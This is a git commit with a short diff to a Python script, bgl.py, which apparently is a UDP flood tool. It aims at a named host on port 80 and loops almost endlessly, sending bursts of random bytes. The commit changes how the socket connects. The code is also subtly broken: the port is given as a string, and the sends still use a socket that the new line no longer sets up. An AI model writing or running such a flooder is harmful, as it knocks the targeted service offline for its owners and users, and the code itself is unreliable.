4008232b2d03ba9df9c0bb1c6153863cc94c50a0
bagol12334 <101828171+bagol12334@users.noreply.github.com>
2022-06-27 02:27:19 +0700

    Update bgl.py

--- bgl.py
+++ bgl.py
@@ -6,7 +6,7 @@ ip = "dststx.xyz"
 port = "80"
 sleep = "0.05"
 
-s.connect((ip, port))
+socket.socket(socket.AF_INET, socket.SOCK_DGRAM).connect((ip, port))
 
 for i in range(1, 100**1000):
     s.send(random._urandom(10)*1000)
